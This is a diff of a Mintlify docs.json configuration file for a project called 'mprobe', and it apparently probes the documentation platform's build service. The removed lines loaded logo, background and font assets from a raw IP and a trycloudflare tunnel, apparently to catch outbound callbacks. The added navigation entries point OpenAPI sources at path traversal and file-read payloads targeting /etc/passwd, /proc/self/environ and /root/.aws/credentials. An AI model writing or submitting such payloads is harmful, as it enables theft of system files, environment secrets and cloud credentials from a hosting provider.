@@ -1,29 +1,9 @@
 {
  "$schema": "https://mintlify.com/docs.json",
- "name": "mprobe867",
+ "name": "mprobe1190t",
  "theme": "mint",
  "colors": {
-  "primary": "#FF0000",
-  "light": "#FFFFFF",
-  "dark": "#111111"
- },
- "logo": {
-  "light": "http://174.138.181.250:8670/svg/logoL_HTTP_T2.svg",
-  "dark": "https://fleece-meter-variance-dna.trycloudflare.com/svg/logoD_T2.svg"
- },
- "background": {
-  "image": "https://fleece-meter-variance-dna.trycloudflare.com/png/bgimg_T2_ORANGE.png"
- },
- "thumbnails": {
-  "preset": "classic",
-  "appearance": "light",
-  "surface": "neutral",
-  "background": "https://fleece-meter-variance-dna.trycloudflare.com/png/text_BG945T2.png",
-  "fonts": {
-   "family": "ProbeF",
-   "source": "https://fleece-meter-variance-dna.trycloudflare.com/txt/font_T2.txt",
-   "format": "ttf"
-  }
+  "primary": "#FF0000"
  },
  "navigation": {
   "groups": [
@@ -32,6 +12,42 @@
     "pages": [
      "index"
     ]
+   },
+   {
+    "group": "CTRL",
+    "openapi": "openapi/ctrl1190.yaml"
+   },
+   {
+    "group": "G1_abs",
+    "openapi": "/etc/passwd"
+   },
+   {
+    "group": "G2_file",
+    "openapi": "file:///etc/passwd"
+   },
+   {
+    "group": "G3_enc",
+    "openapi": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+   },
+   {
+    "group": "G4_env",
+    "openapi": "../../../../proc/self/environ"
+   },
+   {
+    "group": "G5_enc2",
+    "openapi": "..%2f..%2f..%2f..%2fetc/passwd"
+   },
+   {
+    "group": "G6_dslash",
+    "openapi": "//etc/passwd"
+   },
+   {
+    "group": "G7_home",
+    "openapi": "~/../../etc/passwd"
+   },
+   {
+    "group": "G8_aws",
+    "openapi": "../../../../root/.aws/credentials"
    }
   ]
  }
